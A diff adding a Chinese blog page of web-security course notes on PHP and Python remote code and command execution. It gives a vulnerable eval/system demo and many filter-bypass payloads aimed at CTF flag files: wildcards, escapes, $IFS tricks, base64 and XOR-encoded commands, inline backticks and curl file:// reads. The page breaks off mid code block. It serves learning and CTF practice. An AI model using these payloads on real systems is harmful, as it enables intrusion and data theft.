@@ -1,0 +1,944 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><link rel="mask-icon" href="/images/logo.svg" color=""><meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss&#43;xml" title="扬名立万_ymlw" href="/index.xml"><link rel="alternate" type="application/json" title="扬名立万_ymlw" href="/index.json"><link rel="stylesheet" href="/css/local-fonts.css"><link rel="stylesheet" href="/css/app.css">
+<style>body { font-family: "Mulish", -apple-system,"PingFang SC","Microsoft YaHei",sans-serif; }#brand .artboard { font-family: "Fredericka the Great", -apple-system,"PingFang SC","Microsoft YaHei",sans-serif; }#brand h1,
+      h1.title, h2.title, h3.title, h4.title, h5.title, h6.title { font-family: Mulish, "Noto Serif JP", "Noto Serif SC", -apple-system,"PingFang SC","Microsoft YaHei",sans-serif; }h1, h2, h3, h4, h5, h6 { font-family: Mulish, "Noto Serif SC", "Noto Serif JP", -apple-system,"PingFang SC","Microsoft YaHei",sans-serif; }code, pre, kbd, samp, .highlight code, .highlight pre, .code-container { font-family: "Inconsolata", consolas,Menlo,"PingFang SC","Microsoft YaHei",monospace; }</style>
+<style>
+  .highlight pre span[style*="background-color"] {
+    background-color: transparent !important;
+    color: inherit !important;
+  }
+</style>
+
+<style>
+  #search .search-highlight {
+    background: var(--color-red-a1);
+    border-radius: .2rem;
+    color: inherit;
+    font-style: normal;
+    padding: 0 .2rem;
+  }
+
+  #search-hits .search-snippet {
+    color: var(--grey-6);
+    font-size: 80%;
+    line-height: 1.6;
+    margin-top: .2rem;
+  }
+</style>
+
+
+  <meta name="keywords" content=""><link rel="canonical" href="https://www.ctfhub.cn/posts/10/"><meta property="og:url" content="https://www.ctfhub.cn/posts/10/">
+  <meta property="og:site_name" content="扬名立万_ymlw">
+  <meta property="og:title" content="Web攻防-58天RCE命令执行">
+  <meta property="og:description" content="小迪secWeb攻防学习笔记RCE命令执行">
+  <meta property="og:locale" content="zh_cn">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-01-27T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-01-27T00:00:00+00:00">
+    <meta property="og:image" content="https://www.ctfhub.cn/images/avatar.jpg">
+
+  
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://www.ctfhub.cn/images/avatar.jpg">
+  <meta name="twitter:title" content="Web攻防-58天RCE命令执行">
+  <meta name="twitter:description" content="小迪secWeb攻防学习笔记RCE命令执行">
+
+  <title>Web攻防-58天RCE命令执行 - 网络安全 |
+YMLW Shoka = 扬名立万_ymlw</title>
+</head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">Web攻防-58天RCE命令执行</h1>
+  <div class="meta"><span class="item" title="创建时间：2026-01-27">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span><span class="text">发表于</span><time itemprop="dateCreated datePublished" datetime="2026-01-27T00:00:00Z">2026-01-27</time>
+  </span></div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="切换导航栏">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">YMLW Shoka</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax"></div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    <div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">首页</a></span><i class="ic i-angle-right"></i><span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="item" rel="index" title="分类于 网络安全"><span itemprop="name">网络安全</span></a><meta itemprop="position" content="1"></span></div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-cn">
+  <link itemprop="mainEntityOfPage" href="https://www.ctfhub.cn/posts/10/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/1.jpg">
+    <meta itemprop="name" content="扬名立万">
+    <meta itemprop="description" content=", 网安 &amp; 取证的学习笔记">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="扬名立万_ymlw">
+  </span>
+
+  <div class="body md" itemprop="articleBody"><h1 id="rce-利用绕过异或回显">
+  <a class="anchor" href="#rce-%e5%88%a9%e7%94%a8%e7%bb%95%e8%bf%87%e5%bc%82%e6%88%96%e5%9b%9e%e6%98%be" aria-label="Anchor"></a>
+  RCE-利用&amp;绕过&amp;异或&amp;回显
+</h1>
+<p>-RCE 代码执行：引用脚本代码解析执行（代码层面）</p>
+<p>-RCE 命令执行：脚本调用操作系统命令（系统层面）</p>
+<p>参考代码;</p>
+<figure class="highlight php">
+  <figcaption data-lang="php"></figcaption>
+  <table><tr>
+            <td data-num="1"></td>
+            <td><pre><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span></span></pre></td>
+          </tr><tr>
+            <td data-num="2"></td>
+            <td><pre><span></span></pre></td>
+          </tr><tr>
+            <td data-num="3"></td>
+            <td><pre><span>  </span></pre></td>
+          </tr><tr>
+            <td data-num="4"></td>
+            <td><pre><span></span></pre></td>
+          </tr><tr>
+            <td data-num="5"></td>
+            <td><pre><span><span style="color:#75715e">//RCE代码执行 -&gt;命令执行</span></span></pre></td>
+          </tr><tr>
+            <td data-num="6"></td>
+            <td><pre><span><span style="color:#75715e"></span></span></pre></td>
+          </tr><tr>
+            <td data-num="7"></td>
+            <td><pre><span><span style="color:#75715e">//http://192.168.1.4:82/rce/test.php?c=system(&#39;ver&#39;);</span></span></pre></td>
+          </tr><tr>
+            <td data-num="8"></td>
+            <td><pre><span><span style="color:#75715e"></span></span></pre></td>
+          </tr><tr>
+            <td data-num="9"></td>
+            <td><pre><span><span style="color:#75715e">//$code=$_GET[&#39;c&#39;];</span></span></pre></td>
+          </tr><tr>
+            <td data-num="10"></td>
+            <td><pre><span><span style="color:#75715e"></span></span></pre></td>
+          </tr><tr>
+            <td data-num="11"></td>
+            <td><pre><span><span style="color:#75715e">//eval($code);</span></span></pre></td>
+          </tr><tr>
+            <td data-num="12"></td>
+            <td><pre><span><span style="color:#75715e"></span></span></pre></td>
+          </tr><tr>
+            <td data-num="13"></td>
+            <td><pre><span><span style="color:#75715e">//http://192.168.1.4:82/rce/test.php?c=phpinfo();</span></span></pre></td>
+          </tr><tr>
+            <td data-num="14"></td>
+            <td><pre><span><span style="color:#75715e"></span></span></pre></td>
+          </tr><tr>
+            <td data-num="15"></td>
+            <td><pre><span><span style="color:#75715e">//$code=phpinfo();</span></span></pre></td>
+          </tr><tr>
+            <td data-num="16"></td>
+            <td><pre><span><span style="color:#75715e"></span></span></pre></td>
+          </tr><tr>
+            <td data-num="17"></td>
+            <td><pre><span><span style="color:#75715e">//将phpinfo();当做当前语言代码去执行 代码执行漏洞</span></span></pre></td>
+          </tr><tr>
+            <td data-num="18"></td>
+            <td><pre><span><span style="color:#75715e"></span></span></pre></td>
+          </tr><tr>
+            <td data-num="19"></td>
+            <td><pre><span><span style="color:#75715e">//产生条件：可控变量code 触发函数eval</span></span></pre></td>
+          </tr><tr>
+            <td data-num="20"></td>
+            <td><pre><span><span style="color:#75715e"></span></span></pre></td>
+          </tr><tr>
+            <td data-num="21"></td>
+            <td><pre><span>  </span></pre></td>
+          </tr><tr>
+            <td data-num="22"></td>
+            <td><pre><span></span></pre></td>
+          </tr><tr>
+            <td data-num="23"></td>
+            <td><pre><span><span style="color:#75715e">//$code=system(&#39;ver&#39;);</span></span></pre></td>
+          </tr><tr>
+            <td data-num="24"></td>
+            <td><pre><span><span style="color:#75715e"></span></span></pre></td>
+          </tr><tr>
+            <td data-num="25"></td>
+            <td><pre><span>  </span></pre></td>
+          </tr><tr>
+            <td data-num="26"></td>
+            <td><pre><span>  </span></pre></td>
+          </tr><tr>
+            <td data-num="27"></td>
+            <td><pre><span></span></pre></td>
+          </tr><tr>
+            <td data-num="28"></td>
+            <td><pre><span><span style="color:#75715e">//$code=$_GET[&#39;c&#39;];</span></span></pre></td>
+          </tr><tr>
+            <td data-num="29"></td>
+            <td><pre><span><span style="color:#75715e"></span></span></pre></td>
+          </tr><tr>
+            <td data-num="30"></td>
+            <td><pre><span><span style="color:#75715e">//assert($code);</span></span></pre></td>
+          </tr><tr>
+            <td data-num="31"></td>
+            <td><pre><span><span style="color:#75715e"></span></span></pre></td>
+          </tr><tr>
+            <td data-num="32"></td>
+            <td><pre><span>  </span></pre></td>
+          </tr><tr>
+            <td data-num="33"></td>
+            <td><pre><span></span></pre></td>
+          </tr><tr>
+            <td data-num="34"></td>
+            <td><pre><span><span style="color:#75715e">//eval()、assert()、preg_replace()、create_function()、</span></span></pre></td>
+          </tr><tr>
+            <td data-num="35"></td>
+            <td><pre><span><span style="color:#75715e"></span></span></pre></td>
+          </tr><tr>
+            <td data-num="36"></td>
+            <td><pre><span><span style="color:#75715e">//array_map()、call_user_func()、call_user_func_array()、array_filter()、uasort()</span></span></pre></td>
+          </tr><tr>
+            <td data-num="37"></td>
+            <td><pre><span><span style="color:#75715e"></span></span></pre></td>
+          </tr><tr>
+            <td data-num="38"></td>
+            <td><pre><span>  </span></pre></td>
+          </tr><tr>
+            <td data-num="39"></td>
+            <td><pre><span></span></pre></td>
+          </tr><tr>
+            <td data-num="40"></td>
+            <td><pre><span><span style="color:#75715e">//RCE命令执行</span></span></pre></td>
+          </tr><tr>
+            <td data-num="41"></td>
+            <td><pre><span><span style="color:#75715e"></span></span></pre></td>
+          </tr><tr>
+            <td data-num="42"></td>
+            <td><pre><span><span style="color:#75715e">//$cmd=$_GET[&#39;c&#39;];</span></span></pre></td>
+          </tr><tr>
+            <td data-num="43"></td>
+            <td><pre><span><span style="color:#75715e"></span></span></pre></td>
+          </tr><tr>
+            <td data-num="44"></td>
+            <td><pre><span><span style="color:#75715e">//system($cmd);</span></span></pre></td>
+          </tr><tr>
+            <td data-num="45"></td>
+            <td><pre><span><span style="color:#75715e"></span></span></pre></td>
+          </tr><tr>
+            <td data-num="46"></td>
+            <td><pre><span><span style="color:#75715e">//echo &#34;&lt;hr&gt;&#34;;</span></span></pre></td>
+          </tr><tr>
+            <td data-num="47"></td>
+            <td><pre><span><span style="color:#75715e"></span></span></pre></td>
+          </tr><tr>
+            <td data-num="48"></td>
+            <td><pre><span><span style="color:#75715e">//</span></span></pre></td>
+          </tr><tr>
+            <td data-num="49"></td>
+            <td><pre><span><span style="color:#75715e"></span></span></pre></td>
+          </tr><tr>
+            <td data-num="50"></td>
+            <td><pre><span><span style="color:#75715e">//echo exec($cmd);</span></span></pre></td>
+          </tr><tr>
+            <td data-num="51"></td>
+            <td><pre><span><span style="color:#75715e"></span></span></pre></td>
+          </tr><tr>
+            <td data-num="52"></td>
+            <td><pre><span><span style="color:#75715e">//echo &#34;&lt;hr&gt;&#34;;</span></span></pre></td>
+          </tr><tr>
+            <td data-num="53"></td>
+            <td><pre><span><span style="color:#75715e"></span></span></pre></td>
+          </tr><tr>
+            <td data-num="54"></td>
+            <td><pre><span><span style="color:#75715e">//</span></span></pre></td>
+          </tr><tr>
+            <td data-num="55"></td>
+            <td><pre><span><span style="color:#75715e"></span></span></pre></td>
+          </tr><tr>
+            <td data-num="56"></td>
+            <td><pre><span><span style="color:#75715e">//echo shell_exec($cmd);</span></span></pre></td>
+          </tr><tr>
+            <td data-num="57"></td>
+            <td><pre><span><span style="color:#75715e"></span></span></pre></td>
+          </tr><tr>
+            <td data-num="58"></td>
+            <td><pre><span><span style="color:#75715e">//echo &#34;&lt;hr&gt;&#34;;</span></span></pre></td>
+          </tr><tr>
+            <td data-num="59"></td>
+            <td><pre><span><span style="color:#75715e"></span></span></pre></td>
+          </tr><tr>
+            <td data-num="60"></td>
+            <td><pre><span><span style="color:#75715e">//</span></span></pre></td>
+          </tr><tr>
+            <td data-num="61"></td>
+            <td><pre><span><span style="color:#75715e"></span></span></pre></td>
+          </tr><tr>
+            <td data-num="62"></td>
+            <td><pre><span><span style="color:#75715e">//passthru($cmd);</span></span></pre></td>
+          </tr><tr>
+            <td data-num="63"></td>
+            <td><pre><span><span style="color:#75715e"></span></span></pre></td>
+          </tr><tr>
+            <td data-num="64"></td>
+            <td><pre><span><span style="color:#75715e">//echo &#34;&lt;hr&gt;&#34;;</span></span></pre></td>
+          </tr><tr>
+            <td data-num="65"></td>
+            <td><pre><span><span style="color:#75715e"></span></span></pre></td>
+          </tr><tr>
+            <td data-num="66"></td>
+            <td><pre><span>  </span></pre></td>
+          </tr><tr>
+            <td data-num="67"></td>
+            <td><pre><span></span></pre></td>
+          </tr><tr>
+            <td data-num="68"></td>
+            <td><pre><span><span style="color:#66d9ef">echo</span> (<span style="color:#e6db74">&#34;%08%02%08%08%05%0d&#34;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#34;%7b%7b%7b%7c%60%60&#34;</span>);</span></pre></td>
+          </tr><tr>
+            <td data-num="69"></td>
+            <td><pre><span></span></pre></td>
+          </tr><tr>
+            <td data-num="70"></td>
+            <td><pre><span>  </span></pre></td>
+          </tr><tr>
+            <td data-num="71"></td>
+            <td><pre><span></span></pre></td>
+          </tr><tr>
+            <td data-num="72"></td>
+            <td><pre><span><span style="color:#75715e">//http://192.168.1.4:82/rce/test.php?c=ver</span></span></pre></td>
+          </tr><tr>
+            <td data-num="73"></td>
+            <td><pre><span><span style="color:#75715e"></span></span></pre></td>
+          </tr><tr>
+            <td data-num="74"></td>
+            <td><pre><span><span style="color:#75715e">//$cmd=ver</span></span></pre></td>
+          </tr><tr>
+            <td data-num="75"></td>
+            <td><pre><span><span style="color:#75715e"></span></span></pre></td>
+          </tr><tr>
+            <td data-num="76"></td>
+            <td><pre><span><span style="color:#75715e">//将ver当做当前系统命令去执行 命令执行漏洞</span></span></pre></td>
+          </tr><tr>
+            <td data-num="77"></td>
+            <td><pre><span><span style="color:#75715e"></span></span></pre></td>
+          </tr><tr>
+            <td data-num="78"></td>
+            <td><pre><span><span style="color:#75715e">//产生条件：可控变量cmd 触发函数system</span></span></pre></td>
+          </tr><tr>
+            <td data-num="79"></td>
+            <td><pre><span><span style="color:#75715e"></span></span></pre></td>
+          </tr><tr>
+            <td data-num="80"></td>
+            <td><pre><span><span style="color:#75715e">//用到php去运行代码</span></span></pre></td>
+          </tr><tr>
+            <td data-num="81"></td>
+            <td><pre><span><span style="color:#75715e"></span></span></pre></td>
+          </tr><tr>
+            <td data-num="82"></td>
+            <td><pre><span><span style="color:#75715e">//system()、exec()、shell_exec()、pcntl_exec()、popen()、proc_popen()、passthru()、等</span></span></pre></td>
+          </tr></table>
+</figure>
+<p>漏洞函数：</p>
+<p>1、<strong>PHP</strong>:</p>
+<p>PHP代码执行函数：</p>
+<figure class="highlight php">
+  <figcaption data-lang="php"></figcaption>
+  <table><tr>
+            <td data-num="1"></td>
+            <td><pre><span><span style="color:#66d9ef">eval</span>();</span></pre></td>
+          </tr><tr>
+            <td data-num="2"></td>
+            <td><pre><span><span style="color:#a6e22e">assert</span>();</span></pre></td>
+          </tr><tr>
+            <td data-num="3"></td>
+            <td><pre><span><span style="color:#a6e22e">preg_replace</span>();</span></pre></td>
+          </tr><tr>
+            <td data-num="4"></td>
+            <td><pre><span><span style="color:#a6e22e">creat_function</span>();</span></pre></td>
+          </tr><tr>
+            <td data-num="5"></td>
+            <td><pre><span><span style="color:#a6e22e">array_map</span>();</span></pre></td>
+          </tr><tr>
+            <td data-num="6"></td>
+            <td><pre><span><span style="color:#a6e22e">call_user_func</span>();</span></pre></td>
+          </tr><tr>
+            <td data-num="7"></td>
+            <td><pre><span><span style="color:#a6e22e">call_user_func_array</span>();</span></pre></td>
+          </tr><tr>
+            <td data-num="8"></td>
+            <td><pre><span><span style="color:#a6e22e">array_filter</span>();</span></pre></td>
+          </tr><tr>
+            <td data-num="9"></td>
+            <td><pre><span><span style="color:#a6e22e">uasort</span>();<span style="color:#a6e22e">等</span></span></pre></td>
+          </tr></table>
+</figure>
+<p>PHP命令执行函数：</p>
+<figure class="highlight php">
+  <figcaption data-lang="php"></figcaption>
+  <table><tr>
+            <td data-num="1"></td>
+            <td><pre><span><span style="color:#a6e22e">system</span>();</span></pre></td>
+          </tr><tr>
+            <td data-num="2"></td>
+            <td><pre><span><span style="color:#a6e22e">exec</span>();</span></pre></td>
+          </tr><tr>
+            <td data-num="3"></td>
+            <td><pre><span><span style="color:#a6e22e">shell_exec</span>();</span></pre></td>
+          </tr><tr>
+            <td data-num="4"></td>
+            <td><pre><span><span style="color:#a6e22e">pcntl_exec</span>();</span></pre></td>
+          </tr><tr>
+            <td data-num="5"></td>
+            <td><pre><span><span style="color:#a6e22e">popen</span>();</span></pre></td>
+          </tr><tr>
+            <td data-num="6"></td>
+            <td><pre><span><span style="color:#a6e22e">proc_popen</span>();</span></pre></td>
+          </tr><tr>
+            <td data-num="7"></td>
+            <td><pre><span><span style="color:#a6e22e">passthru</span>();<span style="color:#a6e22e">等</span></span></pre></td>
+          </tr></table>
+</figure>
+<p>2、<strong>python</strong></p>
+<figure class="highlight python">
+  <figcaption data-lang="python"></figcaption>
+  <table><tr>
+            <td data-num="1"></td>
+            <td><pre><span>eval</span></pre></td>
+          </tr><tr>
+            <td data-num="2"></td>
+            <td><pre><span>exec</span></pre></td>
+          </tr><tr>
+            <td data-num="3"></td>
+            <td><pre><span>subprocess</span></pre></td>
+          </tr><tr>
+            <td data-num="4"></td>
+            <td><pre><span>os<span style="color:#f92672">.</span>system</span></pre></td>
+          </tr><tr>
+            <td data-num="5"></td>
+            <td><pre><span>commands</span></pre></td>
+          </tr></table>
+</figure>
+<p>3、Java</p>
+<p>Java中没有类似php中eval函数这种直接可以将字符串转换为代码执行的函数，但是有反射机制，并且有各种基于反射机制的表达引擎，如：OGNL、SpEL、MVEL等。</p>
+<p>反弹shell可以使用棱角社区的工具生成命令.</p>
+<h2 id="绕过">
+  <a class="anchor" href="#%e7%bb%95%e8%bf%87" aria-label="Anchor"></a>
+  绕过
+</h2>
+<h3 id="1关键词过滤">
+  <a class="anchor" href="#1%e5%85%b3%e9%94%ae%e8%af%8d%e8%bf%87%e6%bb%a4" aria-label="Anchor"></a>
+  （1）关键词过滤：
+</h3>
+<p>1、过滤flag关键字，采用通配符</p>
+<figure class="highlight bash">
+  <figcaption data-lang="bash"></figcaption>
+  <table><tr>
+            <td data-num="1"></td>
+            <td><pre><span>flag<span style="color:#f92672">=</span>fl*</span></pre></td>
+          </tr><tr>
+            <td data-num="2"></td>
+            <td><pre><span>cat fl*</span></pre></td>
+          </tr><tr>
+            <td data-num="3"></td>
+            <td><pre><span>cat ?la*</span></pre></td>
+          </tr></table>
+</figure>
+<p>2、转义符号</p>
+<figure class="highlight bash">
+  <figcaption data-lang="bash"></figcaption>
+  <table><tr>
+            <td data-num="1"></td>
+            <td><pre><span>ca<span style="color:#ae81ff">\t</span> /fl<span style="color:#ae81ff">\a</span>g</span></pre></td>
+          </tr><tr>
+            <td data-num="2"></td>
+            <td><pre><span>cat fl<span style="color:#e6db74">&#39;&#39;</span>ag</span></pre></td>
+          </tr><tr>
+            <td data-num="3"></td>
+            <td><pre><span>使用空变量$*和$@,$x.<span style="color:#e6db74">${</span>x<span style="color:#e6db74">}</span>绕过</span></pre></td>
+          </tr><tr>
+            <td data-num="4"></td>
+            <td><pre><span>ca$*t fl$*ag</span></pre></td>
+          </tr><tr>
+            <td data-num="5"></td>
+            <td><pre><span>ca$@ fl$@ag</span></pre></td>
+          </tr><tr>
+            <td data-num="6"></td>
+            <td><pre><span>ca$5t f$5lag</span></pre></td>
+          </tr><tr>
+            <td data-num="7"></td>
+            <td><pre><span>ca<span style="color:#e6db74">${</span>2<span style="color:#e6db74">}</span>t f<span style="color:#e6db74">${</span>2<span style="color:#e6db74">}</span>lag</span></pre></td>
+          </tr></table>
+</figure>
+<p>3、拼接法</p>
+<figure class="highlight bash">
+  <figcaption data-lang="bash"></figcaption>
+  <table><tr>
+            <td data-num="1"></td>
+            <td><pre><span>a<span style="color:#f92672">=</span>fl;b<span style="color:#f92672">=</span>ag;cat$IFS$a$b</span></pre></td>
+          </tr></table>
+</figure>
+<p>4、反引号绕过</p>
+<figure class="highlight bash">
+  <figcaption data-lang="bash"></figcaption>
+  <table><tr>
+            <td data-num="1"></td>
+            <td><pre><span>cat <span style="color:#e6db74">`</span>ls<span style="color:#e6db74">`</span></span></pre></td>
+          </tr></table>
+</figure>
+<p>5、编码绕过</p>
+<figure class="highlight bash">
+  <figcaption data-lang="bash"></figcaption>
+  <table><tr>
+            <td data-num="1"></td>
+            <td><pre><span>echo <span style="color:#e6db74">&#39;flag&#39;</span> | base64</span></pre></td>
+          </tr><tr>
+            <td data-num="2"></td>
+            <td><pre><span>cat <span style="color:#e6db74">`</span>echo ZmxhZwo<span style="color:#f92672">=</span> | bash64 -d<span style="color:#e6db74">`</span></span></pre></td>
+          </tr></table>
+</figure>
+<p>6、组合绝活</p>
+<figure class="highlight bash">
+  <figcaption data-lang="bash"></figcaption>
+  <table><tr>
+            <td data-num="1"></td>
+            <td><pre><span>touch <span style="color:#e6db74">&#34;ag&#34;</span></span></pre></td>
+          </tr><tr>
+            <td data-num="2"></td>
+            <td><pre><span>touch <span style="color:#e6db74">&#34;fl\\&#34;</span></span></pre></td>
+          </tr><tr>
+            <td data-num="3"></td>
+            <td><pre><span>touch <span style="color:#e6db74">&#34;t \\&#34;</span></span></pre></td>
+          </tr><tr>
+            <td data-num="4"></td>
+            <td><pre><span>touch <span style="color:#e6db74">&#34;ca\\&#34;</span></span></pre></td>
+          </tr><tr>
+            <td data-num="5"></td>
+            <td><pre><span>ls -t &gt;shell</span></pre></td>
+          </tr><tr>
+            <td data-num="6"></td>
+            <td><pre><span>sh shell</span></pre></td>
+          </tr><tr>
+            <td data-num="7"></td>
+            <td><pre><span></span></pre></td>
+          </tr><tr>
+            <td data-num="8"></td>
+            <td><pre><span><span style="color:#75715e"># \指的是换行</span></span></pre></td>
+          </tr><tr>
+            <td data-num="9"></td>
+            <td><pre><span><span style="color:#75715e"># ls -t 是将文本按时间排序输出</span></span></pre></td>
+          </tr><tr>
+            <td data-num="10"></td>
+            <td><pre><span><span style="color:#75715e"># ls -t &gt;shell 将输出输入到shell文件中</span></span></pre></td>
+          </tr><tr>
+            <td data-num="11"></td>
+            <td><pre><span><span style="color:#75715e"># sh将文本中的文字读取出来执行</span></span></pre></td>
+          </tr></table>
+</figure>
+<p>7、异或无符号（过滤0-9a-zA-Z）</p>
+<figure class="highlight bash">
+  <figcaption data-lang="bash"></figcaption>
+  <table><tr>
+            <td data-num="1"></td>
+            <td><pre><span>异或：rce-xor.php &amp; rce-xor.py</span></pre></td>
+          </tr><tr>
+            <td data-num="2"></td>
+            <td><pre><span>或：rce-xor-or.php &amp; rce-xor-or.py</span></pre></td>
+          </tr></table>
+</figure>
+<p>代码参考：058-Web攻防-RCE执行&amp;DEMO&amp;异或脚本生成等.zip</p>
+<h3 id="2过滤函数关键字">
+  <a class="anchor" href="#2%e8%bf%87%e6%bb%a4%e5%87%bd%e6%95%b0%e5%85%b3%e9%94%ae%e5%ad%97" aria-label="Anchor"></a>
+  （2）过滤函数关键字
+</h3>
+<p>1、内敛执行绕过（system）</p>
+<figure class="highlight bash">
+  <figcaption data-lang="bash"></figcaption>
+  <table><tr>
+            <td data-num="1"></td>
+            <td><pre><span>echo <span style="color:#e6db74">`</span>ls<span style="color:#e6db74">`</span>;</span></pre></td>
+          </tr><tr>
+            <td data-num="2"></td>
+            <td><pre><span>echo <span style="color:#66d9ef">$(</span>ls<span style="color:#66d9ef">)</span>;</span></pre></td>
+          </tr><tr>
+            <td data-num="3"></td>
+            <td><pre><span>?&gt;&lt;?<span style="color:#f92672">=</span><span style="color:#e6db74">`</span>ls<span style="color:#e6db74">`</span></span></pre></td>
+          </tr><tr>
+            <td data-num="4"></td>
+            <td><pre><span>?&gt;&lt;?<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>ls<span style="color:#66d9ef">)</span>;</span></pre></td>
+          </tr></table>
+</figure>
+<p>2、过滤执行命令（如 cat tac等）</p>
+<figure class="highlight bash">
+  <figcaption data-lang="bash"></figcaption>
+  <table><tr>
+            <td data-num="1"></td>
+            <td><pre><span>more：一页一页的显示档案内容</span></pre></td>
+          </tr><tr>
+            <td data-num="2"></td>
+            <td><pre><span>less：与more类似</span></pre></td>
+          </tr><tr>
+            <td data-num="3"></td>
+            <td><pre><span>head：查看头几行</span></pre></td>
+          </tr><tr>
+            <td data-num="4"></td>
+            <td><pre><span>tac：从最后一行开始显示，可以看出tac是cat的反向显示</span></pre></td>
+          </tr><tr>
+            <td data-num="5"></td>
+            <td><pre><span>tail：查看尾几行</span></pre></td>
+          </tr><tr>
+            <td data-num="6"></td>
+            <td><pre><span>nl：显示的适合，顺便输出行号</span></pre></td>
+          </tr><tr>
+            <td data-num="7"></td>
+            <td><pre><span>od：以二进制的方式读取档案内容</span></pre></td>
+          </tr><tr>
+            <td data-num="8"></td>
+            <td><pre><span>vi：一种编辑器，这个也可以查看</span></pre></td>
+          </tr><tr>
+            <td data-num="9"></td>
+            <td><pre><span>vim：一种编辑器，这个也可以查看</span></pre></td>
+          </tr><tr>
+            <td data-num="10"></td>
+            <td><pre><span>sort：可以查看</span></pre></td>
+          </tr><tr>
+            <td data-num="11"></td>
+            <td><pre><span>uniq：可以查看</span></pre></td>
+          </tr><tr>
+            <td data-num="12"></td>
+            <td><pre><span>file -f：报错出具体内容</span></pre></td>
+          </tr><tr>
+            <td data-num="13"></td>
+            <td><pre><span>sh /flag 2&gt;%261 //报错出文件内容</span></pre></td>
+          </tr><tr>
+            <td data-num="14"></td>
+            <td><pre><span>curl file:///root/f/flag</span></pre></td>
+          </tr><tr>
+            <td data-num="15"></td>
+            <td><pre><span>strings flag</span></pre></td>
+          </tr><tr>
+            <td data-num="16"></td>
+            <td><pre><span>uniq -c flag</span></pre></td>
+          </tr><tr>
+            <td data-num="17"></td>
+            <td><pre><span>bash -v flag</span></pre></td>
+          </tr><tr>
+            <td data-num="18"></td>
+            <td><pre><span>rev flag</span></pre></td>
+          </tr></table>
+</figure>
+<p>3、过滤空格</p>
+<figure class="highlight bash">
+  <figcaption data-lang="bash"></figcaption>
+  <table><tr>
+            <td data-num="1"></td>
+            <td><pre><span>%09<span style="color:#f92672">(</span>url传递<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>cat%09flag.php<span style="color:#f92672">)</span></span></pre></td>
+          </tr><tr>
+            <td data-num="2"></td>
+            <td><pre><span>cat<span style="color:#e6db74">${</span>IFS<span style="color:#e6db74">}</span>flag</span></pre></td>
+          </tr><tr>
+            <td data-num="3"></td>
+            <td><pre><span>a<span style="color:#f92672">=</span>fl;b<span style="color:#f92672">=</span>ag;cat$IFS$a$b</span></pre></td>
+          </tr><tr>
+            <td data-num="4"></td>
+            <td><pre><span><span style="color:#f92672">{</span>cat,flag<span style="color:#f92672">}</span></span></pre></td>
+          </tr></table>
+</figure>
+<h3 id="3无回显利用">
+  <a class="anchor" href="#3%e6%97%a0%e5%9b%9e%e6%98%be%e5%88%a9%e7%94%a8" aria-label="Anchor"></a>
+  （3）无回显利用
+</h3>
+<p>1、直接写个文件访问查看</p>
+<p>2、直接进行对外访问接受</p>
+<h1 id="白盒-ctf-rce代码命令">
+  <a class="anchor" href="#%e7%99%bd%e7%9b%92-ctf-rce%e4%bb%a3%e7%a0%81%e5%91%bd%e4%bb%a4" aria-label="Anchor"></a>
+  白盒-CTF-RCE代码命令
+</h1>
+<p>29-通配符</p>
+<figure class="highlight php">
+  <figcaption data-lang="php"></figcaption>
+  <table><tr>
+            <td data-num="1"></td>
